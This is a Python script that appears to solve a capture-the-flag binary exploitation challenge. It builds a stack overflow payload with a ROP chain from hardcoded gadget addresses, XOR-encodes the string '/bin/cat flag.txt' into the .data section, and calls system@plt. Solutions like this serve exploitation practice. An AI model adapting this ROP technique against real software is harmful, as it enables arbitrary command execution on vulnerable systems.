import struct
import pdb

def stringpacker(addr):

    return str(struct.pack("<I",addr))

def padString(inputString, width):
    if len(inputString) % width == 0:
	inputString += "\x00" * width
    else:
	inputString += (width-(len(inputString)%width)) * "\x00"
    return inputString


def encodeString(inputString, xorByte, width):
    inputString = padString(inputString,width)

    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for i in range(0,len(inputStringBytes),width):
	xorVal = inputStringBytes[i] ^ xorByte # we encode only the first byte of the string with XOR
	encodedString += chr(xorVal)
        encodedString += inputString[i+1:i+width]

    return encodedString


def writeStringToLocation(inputString, location,width):

    ropchain = ""

    inputString_encoded = encodeString(inputString,0xFF,width)
    for i in range(0,len(inputString_encoded),width):

# Step 1: Move destination address in ecx
        ropchain += stringpacker(pop_ebx)
        ropchain += stringpacker(data_section + i)
#ebx now contains our data section

        ropchain += stringpacker(zero_edx)
        ropchain += "B"*width # junk to pop into esi
        ropchain += stringpacker(copy_edx_ebx)
        ropchain += "B"*width # junk to pop into ebp
#edx contains now our data section

        ropchain += stringpacker(xchg_ecx_edx)
        ropchain += "B"*width # junk to pop into ebp

# Step 2: Move encoded string into edx

        ropchain += stringpacker(pop_ebx)
        ropchain += inputString_encoded[i:i+width]
#ebx now contains our encoded string

        ropchain += stringpacker(zero_edx)
        ropchain += "B"*width # junk to pop into esi
        ropchain += stringpacker(copy_edx_ebx)
        ropchain += "B"*width # junk to pop into ebp
#edx contains now our encoded

# Step 3: move the encoded string to our target location and decode it

        ropchain += stringpacker(mov_ecxptr_edx)
        ropchain += "B" * width # junk to pop into ebp
        ropchain += "\xFF" * width  # 0xFFFFFFFF to pop into ebx, which will be used for decoding the first of four bytes

    return ropchain

crap = "A" * 44

pop_ebx = 0x080483e1 # pop ebx; ret
zero_edx = 0x08048671 # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
copy_edx_ebx = 0x0804867b # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
xchg_ecx_edx = 0x08048689 # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
mov_ecxptr_edx = 0x08048693 # mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
data_section = 0x804a028 # .data section
system_plt = 0x8048430 # system@plt

cmd_string = "/bin/cat flag.txt"

ropchain = writeStringToLocation(cmd_string,data_section,4)

# Step 4: Call system@plt
ropchain += stringpacker(system_plt)
ropchain += "B" * 4 # fake RET address
ropchain += stringpacker(data_section)


payload = crap


payload += ropchain

print(payload)


